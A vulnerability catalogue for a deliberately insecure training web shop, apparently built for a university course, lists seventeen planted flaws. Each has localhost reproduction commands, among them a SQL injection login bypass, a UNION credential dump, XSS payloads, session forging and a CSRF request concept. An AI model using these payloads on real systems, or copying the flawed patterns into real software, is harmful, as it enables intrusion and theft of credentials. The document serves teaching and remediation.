# SlopShop v0 — Deliberate Vulnerability Catalogue

> **Training artefact.** This is the **v0 baseline** for the DFCS H4013 CA3
> project: a functional web application built *before* any security hardening.
> Every weakness below is **intentional** and exists to be found, tested, and
> remediated across v1 (AI-secured) and v2 (verified/remediated). It runs on
> **localhost with synthetic data only** and must never be deployed.
>
> **Additional 2026-11-15 UI + vulnerability expansion:** the visual redesign and
> VULN-13..17 were also deliberately AI-generated. Include this expansion in
> the AI usage record alongside the original v0 prompts.
>
> **Academic-integrity note:** record in your AI usage log that v0 was
> deliberately prompted to be insecure, so the baseline is not mistaken for an
> accidental result or a banned pre-made training app.

Each weakness is tagged `VULN-xx` in the source. Find them with:

```bash
grep -rn "VULN-" backend/src frontend/src
```

Reproduce them all at once with `./scripts/verify_v0.sh` (backend running on :8080).

## Summary

| ID | Weakness | OWASP Top 10 (2021) | Primary location |
|----|----------|---------------------|------------------|
| VULN-01 | SQL injection (concatenated queries) | A03 Injection | `backend/src/main.rs` login / search / get_product / signup |
| VULN-02 | Plaintext password storage | A02 Cryptographic Failures | `init_db`, `users` table |
| VULN-03 | Forgeable session (`session=<user id>`, non-HttpOnly) | A07 Auth Failures | `session_user_id`, `set_session_cookie` |
| VULN-04 | IDOR — arbitrary user/order by id | A01 Broken Access Control | `get_user`, `get_order` |
| VULN-05 | Missing function-level access control | A01 Broken Access Control | `admin_list_users`, `admin_delete_user`, `create_product`, `delete_product` |
| VULN-06 | Mass assignment — self-register as admin | A04 Insecure Design / A01 | `signup` |
| VULN-07 | Stored XSS | A03 Injection | `frontend` shop/product/index/search `innerHTML` |
| VULN-08 | Reflected XSS | A03 Injection | `frontend/src/pages/search.astro` |
| VULN-09 | Verbose errors + sensitive data disclosure | A05 Misconfiguration / A04 | `db_error`, `me`, `get_user`, `admin_list_users` |
| VULN-10 | Permissive credentialed CORS | A05 Misconfiguration | `CorsLayer` in `main`, missing security headers |
| VULN-11 | No login rate limiting / lockout | A07 Auth Failures | `login` |
| VULN-12 | No CSRF protection | A01 Broken Access Control | all state-changing endpoints |
| VULN-13 | Client-side price tampering | A04 Insecure Design | `create_order`, cart localStorage |
| VULN-14 | Unauthenticated profile update / mass assignment | A01 Broken Access Control | `update_user` |
| VULN-15 | Arbitrary local file read | A01 Broken Access Control | `read_log` |
| VULN-16 | Tokenless account recovery | A07 Auth Failures | `password_reset` |
| VULN-17 | Unvalidated open redirect | A01 Broken Access Control | `logout_redirect` |

---

## VULN-01 — SQL injection
**Location:** `backend/src/main.rs` — `login`, `search`, `get_product`, `signup`, `create_product`, `delete_product` (queries built with `format!`).
**OWASP:** A03:2021 Injection.

User input is concatenated directly into SQL strings instead of using bound
parameters.

**Reproduce — authentication bypass:**
```bash
curl -s -X POST http://localhost:8080/api/login -H 'Content-Type: application/json' \
  -d '{"username":"'"'"' OR '"'"'1'"'"'='"'"'1'"'"' -- ","password":"x"}'
# => {"id":1,"role":"admin","username":"admin"}
```

**Reproduce — UNION credential exfiltration:**
```bash
curl -s --get http://localhost:8080/api/search \
  --data-urlencode "q=%' UNION SELECT id,username,password,0 FROM users -- "
# => results include every username and plaintext password
```

**Impact:** full authentication bypass and database exfiltration.
**Planned v1 fix:** parameterised queries (`?1` bindings) everywhere; reject/escape nothing by hand.

## VULN-02 — Plaintext password storage
**Location:** `init_db` seed + every write to `users.password`.
**OWASP:** A02:2021 Cryptographic Failures.

Passwords are stored and compared as plaintext and returned in API responses.
**Reproduce:** `curl -s http://localhost:8080/api/users/1` → `"password":"admin123"`.
**Impact:** total credential compromise on any read primitive.
**Planned v1 fix:** Argon2id hashing; never return the password field.

## VULN-03 — Forgeable session
**Location:** `session_user_id`, `set_session_cookie`, `current_user`.
**OWASP:** A07:2021 Identification & Authentication Failures.

The session cookie is literally the integer user id — unsigned, not `HttpOnly`,
not `Secure`. Anyone can set `session=1` to become admin, and client-side XSS can
read it.
**Reproduce:** `curl -s -b "session=1" http://localhost:8080/api/me` → admin.
**Impact:** trivial account takeover / privilege escalation.
**Planned v1 fix:** server-side sessions with a high-entropy random id, signed +
`HttpOnly` + `SameSite=Strict` cookie; rotate on login.

## VULN-04 — IDOR (insecure direct object reference)
**Location:** `get_user`, `get_order`.
**OWASP:** A01:2021 Broken Access Control.

`/api/users/:id` and `/api/orders/:id` return any record by id with no
authentication or ownership check.
**Reproduce:** `curl -s http://localhost:8080/api/orders/1` as any/no user.
**Impact:** read any customer's data and orders.
**Planned v1 fix:** require authentication and check `record.user_id == session user` (or admin).

## VULN-05 — Missing function-level access control
**Location:** `admin_list_users`, `admin_delete_user`, `create_product`, `delete_product`.
**OWASP:** A01:2021 Broken Access Control.

Admin/staff endpoints check only that *a* session exists, never the role. The
frontend merely hides the Admin link.
**Reproduce:** register a `customer`, then call `/api/admin/users` with that
cookie → full user + password dump (see `verify_v0.sh` VULN-05).
**Impact:** any user escalates to admin capabilities (list/delete users, manage products).
**Planned v1 fix:** server-side role checks on every privileged handler (middleware/guard).

## VULN-06 — Mass assignment / privilege escalation at signup
**Location:** `signup` (trusts client `role`). Exposed in `frontend/src/pages/signup.astro`.
**OWASP:** A04:2021 Insecure Design (+ A01).

The signup endpoint accepts and stores a client-supplied `role`.
**Reproduce:** `curl -s -X POST .../api/signup -d '{"username":"evil","password":"p","role":"admin"}'`.
**Impact:** anonymous attacker creates an admin account.
**Planned v1 fix:** ignore client role; force `customer`; role changes only via an authorised admin path.

## VULN-07 — Stored XSS
**Location:** `frontend` `index.astro`, `shop.astro`, `product.astro`, `search.astro` (all render `description`/`name` via `innerHTML`); sink fed by `create_product`.
**OWASP:** A03:2021 Injection.

Product fields are stored verbatim and injected as raw HTML.
**Reproduce (confirmed executing):** store a product with description
`<img src=x onerror=document.title=String.fromCharCode(88,83,83,95,70,73,82,69,68)>`
then open `/shop` → `document.title` becomes `XSS_FIRED`.
**Impact:** script execution in every viewer's session (incl. admin) → cookie/session theft, actions-as-user.
**Planned v1 fix:** contextual output encoding (render as text, not HTML); Content-Security-Policy; server-side input validation.

## VULN-08 — Reflected XSS
**Location:** `frontend/src/pages/search.astro` (writes `data.query` into `innerHTML`); backend `search` echoes the raw query.
**OWASP:** A03:2021 Injection.

**Reproduce (confirmed executing):** open
`/search?q=<img src=x onerror=document.title=String.fromCharCode(82,88,83,83,95,70,73,82,69,68)>`
→ `document.title` becomes `RXSS_FIRED`.
**Impact:** one-click XSS via a crafted link.
**Planned v1 fix:** encode on output; stop echoing raw input; CSP.

## VULN-09 — Verbose errors & sensitive data disclosure
**Location:** `db_error` (echoes SQL + driver message); `me`, `get_user`, `admin_list_users` (return passwords).
**OWASP:** A05:2021 Security Misconfiguration / A04 Insecure Design.

**Reproduce:** `curl -s http://localhost:8080/api/products/abc` → raw
`no such column: abc ...` and the full query string.
**Impact:** schema disclosure that accelerates injection; credential leakage.
**Planned v1 fix:** generic error responses + server-side logging only; strip secret fields from DTOs.

## VULN-10 — Permissive credentialed CORS + missing security headers
**Location:** `CorsLayer` in `main` (`AllowOrigin::mirror_request()` + `allow_credentials(true)`).
**OWASP:** A05:2021 Security Misconfiguration.

The API reflects any `Origin` and allows credentials, so any site the victim
visits can make authenticated cross-origin calls. No CSP/HSTS/X-Content-Type-Options either.
**Reproduce:** `curl -si -H "Origin: https://evil.example" .../api/products | grep -i access-control-`.
**Impact:** cross-site data theft and actions using the victim's cookie.
**Planned v1 fix:** allow-list the single trusted frontend origin; add standard security headers.

## VULN-11 — No login rate limiting
**Location:** `login`.
**OWASP:** A07:2021 Authentication Failures.

No throttling or lockout; unlimited credential guessing.
**Reproduce:** `verify_v0.sh` VULN-11 (20 failures, then success).
**Planned v1 fix:** per-account/IP rate limiting + exponential backoff/lockout.

## VULN-12 — No CSRF protection
**Location:** all state-changing endpoints (`POST`/`DELETE`); cookie is `SameSite=Lax` and non-HttpOnly.
**OWASP:** A01:2021 Broken Access Control.

State-changing requests require no anti-CSRF token. Combined with VULN-10 this is
exploitable cross-site.
**Reproduce (concept):** a malicious page issues `fetch('.../api/admin/users/3',
{method:'DELETE',credentials:'include'})`; the browser attaches the victim's session cookie.
**Planned v1 fix:** synchroniser/double-submit CSRF tokens; `SameSite=Strict`; strict CORS.

---

## VULN-13 — Client-side price tampering
**Location:** `create_order`; `frontend/src/pages/cart.astro` localStorage checkout.
**OWASP:** A04:2021 Insecure Design.

The browser calculates the order total from mutable localStorage and the API
accepts it without looking up the products. Negative totals are accepted too.
**Reproduce:**
```bash
curl -s -X POST http://localhost:8080/api/orders -H 'Content-Type: application/json' \
  -d '{"items":[{"id":4,"name":"SlopSecurity Ultimate","price":0.01}],"total":0.01}'
# => order is accepted for €0.01 rather than €99.99
```
**Impact:** free purchases, arbitrary prices, or nonsensical negative orders.
**Planned v1 fix:** ignore client totals; load prices from the database and calculate server-side.

## VULN-14 — Unauthenticated profile update and mass assignment
**Location:** `update_user` (`PUT /api/users/:id`); account profile editor.
**OWASP:** A01:2021 Broken Access Control.

No session or ownership check protects profile updates, and the client can
supply a new role. This is separate from signup mass assignment: existing
accounts can be modified anonymously.
**Reproduce:**
```bash
curl -s -X PUT http://localhost:8080/api/users/3 -H 'Content-Type: application/json' \
  -d '{"address":"Changed without logging in","role":"admin"}'
# Restore synthetic data: repeat with role=customer and the original Cork address.
```
**Impact:** account/profile tampering and privilege escalation.
**Planned v1 fix:** require a session and ownership; allow only an explicit list of editable fields.

## VULN-15 — Arbitrary local file read
**Location:** `read_log` (`GET /api/logs?file=`); Admin → Server tools.
**OWASP:** A01:2021 Broken Access Control.

A client-controlled path is opened directly, without authentication, path
normalisation, or a permitted directory. It exposes readable local files.
**Reproduce (non-sensitive project file):**
```bash
curl -s --get http://localhost:8080/api/logs --data-urlencode 'file=Cargo.toml'
```
**Impact:** disclosure of application configuration and other local files.
**Planned v1 fix:** use fixed log IDs mapped to known paths; reject traversal and require staff/admin authorisation.

## VULN-16 — Tokenless password reset
**Location:** `password_reset`; `frontend/src/pages/reset.astro`.
**OWASP:** A07:2021 Identification and Authentication Failures.

Only a username and new password are required. No current password,
single-use reset token, expiry, or verified email is involved.
**Reproduce:**
```bash
curl -s -X POST http://localhost:8080/api/password-reset -H 'Content-Type: application/json' \
  -d '{"username":"staff","password":"staff123"}'
```
**Impact:** anonymous account takeover for any known username.
**Planned v1 fix:** single-use, expiring high-entropy tokens tied to a verified account; invalidate sessions on reset.

## VULN-17 — Unvalidated open redirect
**Location:** `logout_redirect` (`GET /api/logout?next=`); Admin → Sign-out redirect.
**OWASP:** A01:2021 Broken Access Control.

The server copies an arbitrary URL into the `Location` response header.
**Reproduce:**
```bash
curl -sI 'http://localhost:8080/api/logout?next=https%3A%2F%2Fexample.com' | grep -i location
# => location: https://example.com
```
**Impact:** trusted application links can send users to a phishing destination.
**Planned v1 fix:** permit only local relative paths from an explicit allow-list; never redirect to arbitrary origins.

---

## Suggested mapping to security requirements (for the verification matrix)

| Requirement | Claim to test in v1 | Related VULN |
|---|---|---|
| SEC-01 Authentication | Passwords hashed (Argon2id), not plaintext | VULN-02 |
| SEC-02 Authorisation | Users access only their own records; admin APIs enforce role | VULN-04, VULN-05 |
| SEC-03 Session management | Random, signed, HttpOnly session; rotates on login | VULN-03 |
| SEC-04 Input handling (injection) | Parameterised SQL; no injection | VULN-01 |
| SEC-05 Output handling (XSS) | Contextual encoding + CSP | VULN-07, VULN-08 |
| SEC-06 Registration integrity | Server assigns role; no mass assignment | VULN-06 |
| SEC-07 Error handling | Generic errors; no secret/stack disclosure | VULN-09 |
| SEC-08 Configuration | Strict CORS + security headers | VULN-10 |
| SEC-09 Anti-automation | Login rate limiting / lockout | VULN-11 |
| SEC-10 CSRF | Anti-CSRF tokens on state-changing requests | VULN-12 |
| SEC-11 Business logic | Server calculates prices; rejects negative/tampered totals | VULN-13 |
| SEC-12 Object modification | Authenticated, authorised, field-restricted profile updates | VULN-14 |
| SEC-13 File access | Authorised fixed-file lookup; no traversal or arbitrary paths | VULN-15 |
| SEC-14 Account recovery | Verified, expiring, single-use reset tokens | VULN-16 |
| SEC-15 Navigation safety | Only validated local redirect destinations | VULN-17 |
